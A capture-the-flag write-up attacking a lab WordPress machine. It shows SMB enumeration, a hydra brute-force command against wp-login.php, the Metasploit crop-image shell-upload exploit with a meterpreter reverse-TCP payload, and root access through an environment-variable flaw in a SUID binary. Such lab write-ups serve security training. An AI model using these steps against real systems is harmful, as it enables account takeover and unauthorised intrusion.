For my run, the IP address of the virtual machine was 10.10.20.26. Remember to change it where necessary when reading this writeup!
```
$ export IP=10.10.20.26
```

Let's start by enumerating the machine ports:
```
$ nmap -sV -sC $IP

Hmm, Samba? Let's try and use [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) to see what's up with this smb service...

```

Aha! We have a SMB share called "BillySMB" that we can map and list! Also, we found a unix user called "bjoel". Alright!

Let's check first this SMB share. 
```

Hmm, let's download these files and analyze them. 
First one, Alice-White-Rabbit.jpg: It's a jpeg file, we can use steghide:
```
$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
```
Oh no, i don't like this file name. Let's read it...
```
$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
```
The other two files are a (funny) mp4 music clip, and a QR code, that leads to an youtube music clip (good music though! Long Live the 80's!). No hints there. 

So, this whole SMB thing was a rabbit hole. Let's check other places! This is a blog, and we've checked port 80 is open! Let's see what we have here...

Hmm, wp-admin... So this is a WordPress site. It's a good time to remember to add the IP to /etc/hosts, so the site works just fine. 
`10.10.20.26	blog.thm`

Now, if we try and access 'http://blog.htm/wp-admin', we get an WordPress login screen!<br>
<img src="writeup_img1.png">


Let's see... is the user "admin" still the default user for this?<br>
<img src="writeup_img2.png">


No. But we've found an user 'bjoel' in our enum4linux! maybe he is a valid user?<br>
<img src="writeup_img3.jpg">

Yes he is! We could try and brute-force his password with hydra! (SPOILERS: It doesn't work well.)

Ok, so what we could do?

Ah, there is [WPScan](https://github.com/wpscanteam/wpscan), we could try to use this to enumerate all the WordPress users:

```
$ docker run -it --rm wpscanteam/wpscan --url $IP --enumerate u

So we have now some GOOD info! there are two users: bjoel and kwheel, and we know by using the browser that 'kwheel' (Karen Wheeler) have author access to the blog! Also, this is WordPress 5.0, which is vulnerable!
If we take a look at [exploit-db](https://www.exploit-db.com/), We find out that there is a vulnerability "WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)", and by reading it we learn that we need the username and password for someone with author access. Maybe kwheel is our ticket to this machine!

Let's try and brute-force kwheel's password. First we press F12 on your browser and go to the network tab of the developer tools, and enter some random password for 'kwheel'; We are interested in the post message of the web site. We get this post data:
```
log=kwheel&pwd=123&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1
```
Now we are going to use this into hydra:
```
$ hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -V

(...)

[80][http-post-form] host: 10.10.20.26   login: kwheel   password: <REDACTED>
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-11 11:34:37
```
Now we have the password for kwheel!

We could log in in the admin panel and take a look, but since we know that there is a metasploit script for our exploit, we'll proceed and open metasploit:

```
msf5 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


msf5 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf5 exploit(multi/http/wp_crop_rce) > 
```

Now just set the options (USERNAME, PASSWORD, RHOSTS, LHOST) and exploit!

We can run 'shell' now and take a look on what's going on inside the machine. We have two goals: the files user.txt and root.txt.
If we do a find on the machine:
```
$ find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
```
ok cool, BUT when we try and read it...
```
$ cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```
Ok. We can try a little bit harder. Let's search for SUID files for that sweet privesc!
```
find / -perm -u=s -type f 2>/dev/null
```

We have some common files, BUT there is an interesting one... `/usr/sbin/checker`. Never heard of this one. After checking on [GTFOBins](https://gtfobins.github.io/), we are sure that this is not a usual binary. Hmmmm...
Let's take a look on how this thing works.
```
$ ls -la /usr/sbin/checker     
-rwsr-sr-x 1 root root 8432 May 26 18:27 /usr/sbin/checker
```
So it is a root owned binary, with SUID flag on. What happens when we run it?

```
$ ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

So it gets the "admin" environment variable and prints out "Not an Admin". Wait, so if we set this environment variable, what happens?
```
$ export admin=1
$ ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```
Oh, so now it tries to run bash! And since this is owned by root, it'll run bash as root! SWEET!
```
$ checker
$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
Let's try again that stuff to find the user flag:
```
$ find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
/media/usb/user.txt
```
Oh, it was there! 
```
$ cat /media/usb/user.txt
<REDACTED>
```

and of course, the root flag:
```
$ cat /root/root.txt
<REDACTED>
```

And that's it! It was quite a nice room, and I've enjoyed it a lot!

Thank you for reading this write-up!
